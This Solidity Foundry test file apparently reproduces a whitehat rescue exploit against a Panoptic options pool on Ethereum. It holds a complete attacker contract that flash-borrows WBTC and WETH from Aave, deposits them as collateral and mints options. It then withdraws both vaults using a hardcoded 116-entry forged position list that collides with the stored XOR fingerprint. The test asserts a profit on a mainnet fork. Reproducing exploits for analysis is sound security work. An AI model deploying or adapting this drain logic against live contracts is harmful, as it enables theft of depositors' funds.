// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost: No user loss; whitehat rescue
// Whitehat: https://etherscan.io/address/0xa1F0A9d51b592ee074eD6987006976908631503B
// Rescue Tx: https://etherscan.io/tx/0x67a45dfe5ff4b190058674d7c791bbdc48e889f319f937c24fa13a5f9093f088
// Vulnerable Pool: https://etherscan.io/address/0x000000000000100921465982d28b37D2006e87Fc
//
// Panoptic stored a user's position set as a truncated XOR fingerprint. A forged
// list with the same fingerprint, but no owned positions, made the account look
// solvent and allowed both collateral vaults to be drained.

interface IAaveV3Pool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IPanopticPool {
    function mintOptions(
        uint256[] calldata positionIdList,
        uint128 positionSize,
        uint64 effectiveLiquidityLimitX32,
        int24 tickLimitLow,
        int24 tickLimitHigh
    ) external;
}

interface IPanopticCollateral {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function withdraw(
        uint256 assets,
        address receiver,
        address owner,
        uint256[] calldata positionIdList
    ) external returns (uint256 shares);
}

contract PanopticAttacker {
    IAaveV3Pool private constant AAVE = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IPanopticPool private constant PANOPTIC = IPanopticPool(0x000000000000100921465982d28b37D2006e87Fc);
    IPanopticCollateral private constant COLLATERAL_WBTC =
        IPanopticCollateral(0xb310cf625f519DA965c587e22Ff6Ecb49809eD09);
    IPanopticCollateral private constant COLLATERAL_WETH =
        IPanopticCollateral(0x1F8D600A0211DD76A8c1Ac6065BC0816aFd118ef);

    uint256 private constant WBTC_LOAN = 23_059_888;
    uint256 private constant WETH_LOAN = 28_167_022_008_366_041_110;
    uint256 private constant POSITION_0 = 3_778_244_379_283_224_821_463_586_597_824;
    uint256 private constant POSITION_1 = 2_570_843_629_053_219_211_274_302_417_856;

    function attack() external {
        address[] memory assets = new address[](2);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = WBTC_LOAN;
        amounts[1] = WETH_LOAN;

        uint256[] memory modes = new uint256[](2);
        AAVE.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE), "not Aave");

        WBTC.approve(address(COLLATERAL_WBTC), type(uint256).max);
        WETH.approve(address(COLLATERAL_WETH), type(uint256).max);
        COLLATERAL_WBTC.deposit(amounts[0], address(this));
        COLLATERAL_WETH.deposit(amounts[1], address(this));

        uint256[] memory positions = new uint256[](1);
        positions[0] = POSITION_0;
        PANOPTIC.mintOptions(positions, 11_529_944, 0, -887_272, 887_272);

        positions = new uint256[](2);
        positions[0] = POSITION_0;
        positions[1] = POSITION_1;
        PANOPTIC.mintOptions(positions, 14_083_511_004_183_020_555, 0, -887_272, 887_272);

        uint256[] memory forged = _forgedPositionList();
        COLLATERAL_WBTC.withdraw(34_568_661, address(this), address(this), forged);
        COLLATERAL_WETH.withdraw(42_224_675_242_709_202_399, address(this), address(this), forged);

        WBTC.approve(address(AAVE), amounts[0] + premiums[0]);
        WETH.approve(address(AAVE), amounts[1] + premiums[1]);
        return true;
    }

    function _forgedPositionList() private pure returns (uint256[] memory forged) {
        forged = new uint256[](116);
        forged[0] = 16932343400165264;
        forged[1] = 16988277108887827;
        forged[2] = 16993655162578412;
        forged[3] = 16939609024273842;
        forged[4] = 16995993874926379;
        forged[5] = 17133860513315788;
        forged[6] = 17107685890532457;
        forged[7] = 17083582814389265;
        forged[8] = 16940269736292543;
        forged[9] = 17101708812844843;
        forged[10] = 16927858255610090;
        forged[11] = 17086352299123725;
        forged[12] = 16916111252789762;
        forged[13] = 16980362901391387;
        forged[14] = 17003795739444277;
        forged[15] = 17101378560687335;
        forged[16] = 17006045362593199;
        forged[17] = 17030439208130036;
        forged[18] = 17063366226512834;
        forged[19] = 16905884702516433;
        forged[20] = 17119504401467382;
        forged[21] = 17034803466092545;
        forged[22] = 16985606900097701;
        forged[23] = 16942964596981210;
        forged[24] = 17025612530710537;
        forged[25] = 16889820611195521;
        forged[26] = 16954544221541041;
        forged[27] = 16949521359855531;
        forged[28] = 16914178675719633;
        forged[29] = 16890694515986045;
        forged[30] = 17119951603807036;
        forged[31] = 17119329401324348;
        forged[32] = 16935941131740839;
        forged[33] = 16999873957325411;
        forged[34] = 17031339119151811;
        forged[35] = 17049620233322987;
        forged[36] = 16997018527186481;
        forged[37] = 16900417526689188;
        forged[38] = 17130624793684447;
        forged[39] = 17073996118339521;
        forged[40] = 17073485236538696;
        forged[41] = 16941005867879549;
        forged[42] = 17067919565309087;
        forged[43] = 17103589480369901;
        forged[44] = 16897464278369093;
        forged[45] = 17144420237880467;
        forged[46] = 17101150678162124;
        forged[47] = 16927713925256617;
        forged[48] = 17027825720482802;
        forged[49] = 17062001812029684;
        forged[50] = 17038739514264792;
        forged[51] = 16896222394180792;
        forged[52] = 17100042690718021;
        forged[53] = 17005578710070990;
        forged[54] = 17052541747857150;
        forged[55] = 17001603935953842;
        forged[56] = 17038292193577029;
        forged[57] = 17130759040409663;
        forged[58] = 17166195869489409;
        forged[59] = 17101208203141327;
        forged[60] = 16908147932247101;
        forged[61] = 17017661774688634;
        forged[62] = 16908153974732775;
        forged[63] = 16913597968133068;
        forged[64] = 17014445553286162;
        forged[65] = 16974767401004252;
        forged[66] = 16967923632426531;
        forged[67] = 16895531852075711;
        forged[68] = 17099849001593597;
        forged[69] = 17153702279128601;
        forged[70] = 16929239666017003;
        forged[71] = 17020691157262149;
        forged[72] = 16897926812058864;
        forged[73] = 17044600072961146;
        forged[74] = 17064714233413875;
        forged[75] = 17045419378318324;
        forged[76] = 16946829128487768;
        forged[77] = 17050277920000050;
        forged[78] = 17146520609095429;
        forged[79] = 17032253897074887;
        forged[80] = 16907480429887088;
        forged[81] = 16962955384487272;
        forged[82] = 16929389484689115;
        forged[83] = 16934457177659003;
        forged[84] = 16894109815048865;
        forged[85] = 17142593927072576;
        forged[86] = 17088317117953075;
        forged[87] = 17128654064464828;
        forged[88] = 17029938928325889;
        forged[89] = 17094514593261230;
        forged[90] = 16888769806416760;
        forged[91] = 17029198303267245;
        forged[92] = 17004523319620584;
        forged[93] = 16947327288449607;
        forged[94] = 17029065097821193;
        forged[95] = 16996711919775464;
        forged[96] = 17057227897167136;
        forged[97] = 16990649632113938;
        forged[98] = 17060232259853742;
        forged[99] = 16968539133849167;
        forged[100] = 16944179477276374;
        forged[101] = 16919590554483084;
        forged[102] = 16900114985532166;
        forged[103] = 16993502753544935;
        forged[104] = 16953408099015714;
        forged[105] = 17161081997515482;
        forged[106] = 17154610629572122;
        forged[107] = 17022685737634914;
        forged[108] = 16991628369728980;
        forged[109] = 17064829018677470;
        forged[110] = 17057008683916553;
        forged[111] = 17087643854683771;
        forged[112] = 16932248563778116;
        forged[113] = 16991286763756420;
        forged[114] = 3437866335631248550078689307201264;
        forged[115] = 3437866335631248550078689307201264;
    }
}

contract PanopticV11ExploitTest is Test {
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 private constant RESCUE_TX = 0x67a45dfe5ff4b190058674d7c791bbdc48e889f319f937c24fa13a5f9093f088;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.public.blastapi.io", RESCUE_TX);
    }

    function testExploit() public {
        PanopticAttacker attacker = new PanopticAttacker();
        attacker.attack();

        uint256 wbtcProfit = WBTC.balanceOf(address(attacker));
        uint256 wethProfit = WETH.balanceOf(address(attacker));
        emit log_named_decimal_uint("WBTC profit", wbtcProfit, 8);
        emit log_named_decimal_uint("WETH profit", wethProfit, 18);
        assertGt(wbtcProfit, 0.1e8);
        assertGt(wethProfit, 10 ether);
    }
}
